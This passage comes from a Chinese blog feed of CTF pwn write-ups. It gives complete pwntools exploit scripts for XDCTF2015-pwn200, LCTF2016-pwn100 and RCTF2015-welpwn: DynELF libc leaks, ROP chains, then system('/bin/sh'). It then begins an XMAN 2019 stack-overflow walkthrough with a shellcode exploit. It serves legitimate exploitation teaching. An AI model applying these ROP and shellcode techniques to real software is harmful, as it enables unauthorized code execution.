<span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>] </span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p><strong>其他需要注意的地址</strong></p><p>在信息泄露过程中，由于循环制造溢出，故可能会导致栈结构发生不可预料的变化，可以尝试调用目标二进制程序的_start函数来重新开始程序以恢复栈。</p><p><strong>XDCTF2015-pwn200</strong></p><p>本题是32位linux下的二进制程序，无cookie，存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件。具体的栈溢出位置等调试过程就不细说了，只简要说一下<strong>借助DynELF实现利用的要点：</strong></p><p> 1）调用write函数来泄露地址信息，比较方便；</p><p> 2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；</p><p> 3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；</p><p> 4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。</p><p>接下来就直接给出利用代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = process(<span class="string">"./xdctf-pwn200"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./xdctf-pwn200"</span>)</span><br><span class="line">writeplt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">writegot = elf.got[<span class="string">'write'</span>]</span><br><span class="line">readplt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">readgot = elf.got[<span class="string">'read'</span>]</span><br><span class="line">vulnaddress =  <span class="number">0x08048484</span> </span><br><span class="line">startaddress = <span class="number">0x080483d0</span>      <span class="comment">#调用start函数，用以恢复栈</span></span><br><span class="line">bssaddress =   <span class="number">0x0804a020</span>    <span class="comment">#用来写入“/bin/sh”字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  payload = <span class="string">"A"</span> * <span class="number">112</span></span><br><span class="line">  payload += p32(writeplt)</span><br><span class="line">  payload += p32(vulnaddress)</span><br><span class="line">  payload += p32(<span class="number">1</span>)</span><br><span class="line">  payload += p32(address)</span><br><span class="line">  payload += p32(<span class="number">4</span>)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">print</span> p.recvline()</span><br><span class="line">dynelf = DynELF(leak, elf=ELF(<span class="string">"./lctf-pwn200"</span>))</span><br><span class="line">systemAddress = dynelf.lookup(<span class="string">"__libc_system"</span>, <span class="string">"libc"</span>) </span><br><span class="line"><span class="keyword">print</span> <span class="string">"systemAddress:"</span>, hex(systemAddress)</span><br><span class="line"><span class="comment">#调用_start函数，恢复栈</span></span><br><span class="line">payload1 = <span class="string">"A"</span> * <span class="number">112</span></span><br><span class="line">payload1 += p32(startaddress) </span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">ppprAddress = <span class="number">0x0804856c</span>  <span class="comment">#获取到的连续3次pop操作的gadget的地址 </span></span><br><span class="line">payload1 = <span class="string">"A"</span> * <span class="number">112</span></span><br><span class="line">payload1 += p32(readplt)</span><br><span class="line">payload1 += p32(ppprAddress)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(bssaddress)</span><br><span class="line">payload1 += p32(<span class="number">8</span>)</span><br><span class="line">payload1 += p32(systemAddress) + p32(vulnaddress) + p32(bssaddress)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.send(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>LCTF2016-pwn100</strong></p><p>本题是64位linux下的二进制程序，无cookie，也存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，但和上一题相比，存在两处差异：</p><p><strong>1）64位linux下的函数需要通过rop链将参数传入寄存器，而不是依靠栈布局；</strong></p><p><strong>2）puts函数与write函数不同，不能指定输出字符串的长度。</strong></p><p>根据上文给出的解决方法，构造利用脚本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = process(<span class="string">"./pwn100"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn100"</span>)</span><br><span class="line">readplt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">readgot = elf.got[<span class="string">'read'</span>]</span><br><span class="line">putsplt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">putsgot = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">mainaddress =   <span class="number">0x4006b8</span></span><br><span class="line">startaddress =   <span class="number">0x400550</span></span><br><span class="line">poprdi =     <span class="number">0x400763</span></span><br><span class="line">pop6address  =  <span class="number">0x40075a</span>   </span><br><span class="line">movcalladdress = <span class="number">0x400740</span></span><br><span class="line">waddress =     <span class="number">0x601000</span> <span class="comment">#可写的地址，bss段地址在我这里好像不行，所以选了一个别的地址，应该只要不是readonly的地址都可以  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">''</span></span><br><span class="line">  payload = <span class="string">"A"</span> * <span class="number">64</span> + <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">  payload += p64(poprdi) + p64(address)</span><br><span class="line">  payload += p64(putsplt)</span><br><span class="line">  payload += p64(startaddress)</span><br><span class="line">  payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="keyword">print</span> p.recvuntil(<span class="string">'bye~n'</span>)</span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:</span><br><span class="line">      data = data[:<span class="number">-1</span>]</span><br><span class="line">      data += <span class="string">"x00"</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      data += c</span><br><span class="line">    up = c</span><br><span class="line">  data = data[:<span class="number">4</span>]</span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./pwn100'</span>))</span><br><span class="line">systemAddress = d.lookup(<span class="string">'__libc_system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"systemAddress:"</span>, hex(systemAddress)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------write /bin/sh to bss--------------"</span></span><br><span class="line">payload1 = <span class="string">"A"</span> * <span class="number">64</span> + <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload1 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(readgot) + p64(<span class="number">8</span>) + p64(waddress) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(movcalladdress)</span><br><span class="line">payload1 += <span class="string">'x00'</span>*<span class="number">56</span></span><br><span class="line">payload1 += p64(startaddress)</span><br><span class="line">payload1 =  payload1.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'bye~n'</span>)</span><br><span class="line">p.send(<span class="string">"/bin/shx00"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------get shell--------------"</span></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">64</span> + <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload2 += p64(poprdi) + p64(waddress)</span><br><span class="line">payload2 += p64(systemAddress)</span><br><span class="line">payload2 += p64(startaddress)</span><br><span class="line">payload2 =  payload2.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>RCTF2015-welpwn</strong></p><p>本题也是64位linux下的二进制程序，无cookie，也存在明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，与其他两题的区别主要在于利用过程比较绕。</p><p> 整个程序逻辑是这样的，main函数中，用户可以输入1024个字节，并通过echo函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以“x00”作为字符串终止符，故如果我们的payload中存在这个字符，则不会复制成功；但实际情况是，因为要用到上面提到的通用gadget来为write函数传参，故肯定会在payload中包含“x00”字符。</p><p> 这个题目设置了这个障碍，也为这个障碍的绕过提供了其他条件。即由于echo函数的栈空间很小，与main函数栈中的输入字符串之间只间隔32字节，故我们可以利用这一点，只复制过去24字节数据加上一个包含连续4个pop指令的gadget地址，并借助这个gadget跳过原字符串的前32字节数据，即可进入我们正常的通用gadget调用过程，具体脚本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = process(<span class="string">"./welpwn"</span>)</span><br><span class="line">elf = ELF(<span class="string">"welpwn"</span>)</span><br><span class="line">readplt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">readgot = elf.got[<span class="string">"read"</span>]</span><br><span class="line">writeplt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">writegot = elf.got[<span class="string">"write"</span>]</span><br><span class="line">startAddress =    <span class="number">0x400630</span></span><br><span class="line">popr12r13r14r15  = <span class="number">0x40089c</span></span><br><span class="line">pop6address    = <span class="number">0x40089a</span></span><br><span class="line">movcalladdress  = <span class="number">0x400880</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  <span class="keyword">print</span> p.recv(<span class="number">1024</span>)</span><br><span class="line">  payload = <span class="string">"A"</span> * <span class="number">24</span></span><br><span class="line">  payload += p64(popr12r13r14r15)</span><br><span class="line">  payload += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(writegot) + p64(<span class="number">8</span>) + p64(address) + p64(<span class="number">1</span>)</span><br><span class="line">  payload += p64(movcalladdress)</span><br><span class="line">  payload += <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">  payload += p64(startAddress)</span><br><span class="line">  payload =  payload.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">dynelf = DynELF(leak, elf=ELF(<span class="string">"./welpwn"</span>))</span><br><span class="line">systemAddress = dynelf.lookup(<span class="string">"__libc_system"</span>, <span class="string">"libc"</span>)</span><br><span class="line"><span class="keyword">print</span> hex(systemAddress)</span><br><span class="line">bssAddress = <span class="number">0x601070</span></span><br><span class="line">poprdi =     <span class="number">0x4008a3</span></span><br><span class="line"><span class="keyword">print</span> p.recv(<span class="number">1024</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">24</span></span><br><span class="line">payload += p64(popr12r13r14r15)</span><br><span class="line">payload += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(readgot) + p64(<span class="number">8</span>) + p64(bssAddress) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(movcalladdress)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">payload += p64(poprdi)</span><br><span class="line">payload += p64(bssAddress)</span><br><span class="line">payload += p64(systemAddress)</span><br><span class="line">payload = payload.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">"/bin/shx00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>由于该题目程序中也包含puts函数，故我们也可以用puts函数来实现leak，代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">''</span></span><br><span class="line">  <span class="keyword">print</span> p.recv(<span class="number">1024</span>)</span><br><span class="line">  payload = <span class="string">"A"</span> * <span class="number">24</span></span><br><span class="line">  payload += p64(popr12r13r14r15)</span><br><span class="line">  payload += p64(poprdi) + p64(address)</span><br><span class="line">  payload += p64(putsplt)</span><br><span class="line">  payload += p64(startAddress)</span><br><span class="line">  payload = payload.ljust(<span class="number">1020</span>, <span class="string">"B"</span>)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="comment">#由于echo函数最后会输出复制过去的字符串，而该字符串是popr12r13r14r15，故我们可以将该gadget的地址作为判断输出结束的依据</span></span><br><span class="line">  <span class="keyword">print</span> p.recvuntil(<span class="string">"x9cx08x40"</span>) </span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = p.recv(<span class="number">1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'n'</span> <span class="keyword">and</span> c == <span class="string">"W"</span>: <span class="comment">#下一轮输出的首字母就是“Welcome”中的“W”</span></span><br><span class="line">      data = data[:<span class="number">-1</span>]</span><br><span class="line">      data += <span class="string">"x00"</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      data += c</span><br><span class="line">    up = c</span><br><span class="line">  data = data[:<span class="number">4</span>]</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XMAN-2019-福州-PWN-stackoverflow（上）</title>
      <link href="/2019/08/06/XMAN-2019-%E2%95%95%C3%BA%E2%95%93%E2%96%8C-PWN-stackoverflow%C3%BA%C2%BF%E2%95%94%E2%95%A7%C3%BA%E2%8C%90/"/>
      <url>/2019/08/06/XMAN-2019-%E2%95%95%C3%BA%E2%95%93%E2%96%8C-PWN-stackoverflow%C3%BA%C2%BF%E2%95%94%E2%95%A7%C3%BA%E2%8C%90/</url>
      
        <content type="html"><![CDATA[<p>今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出<code>simple_stackoverflow2</code>到ROP的<code>simple_stackoverflow2_nx</code>过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。</p><p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p><h2 id="simple-stackoverflow"><a href="#simple-stackoverflow" class="headerlink" title="simple_stackoverflow"></a>simple_stackoverflow</h2><p>先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflow[<span class="number">24</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    read(<span class="number">0</span>, overflow, <span class="number">1023</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IDA Pro反汇编出来的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0</span>);</span><br><span class="line">  overflow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;::buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查一下开启的保护措施</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>可以得知存在非常明显的栈溢出漏洞，只要第一次把shellcode写入全局的buf内存中，第二次通过栈溢出覆盖返回地址，使流程跳转到shellcode地址处执行shellcode代码即可。</p><p>通过计算得出栈的大小应该为<code>0x20 = 32</code>,然后因为32位机器加上4个字节即为<code>36</code>，也可以通过工具中的    <code>pattern.py</code>脚本计算得出。</p><p>使用<code>pattern.py</code>脚本首先生成字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py create 150</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure><p>然后通过gdb调试程序，在输入点输入字符串，然后可以得到溢出的内存地点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41326241 in ?? ()</span><br></pre></td></tr></table></figure><p>然后通过脚本计算溢出点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py offset 0x41326241</span><br><span class="line">hex pattern decoded as: Ab2A</span><br><span class="line">36</span><br></pre></td></tr></table></figure><p>通过IDA Pro可以找到全局buf的地址为<code>0x804a060</code></p><p>则我们的payload可以这样写</p><p><code>36 * &#39;A&#39;+p32(0x804a060)</code></p><p>最终的Exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./simple_stackoverflow'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a060</span></span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.sendline(<span class="number">36</span> * <span class="string">'A'</span> + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="simple-stackoverflow2"><a href="#simple-stackoverflow2" class="headerlink" title="simple_stackoverflow2"></a>simple_stackoverflow2</h2><p>先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflow[<span class="number">24</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    read(<span class="number">0</span>, overflow, <span class="number">1023</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后看看IDA反汇编出来的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> overflow();</span><br><span 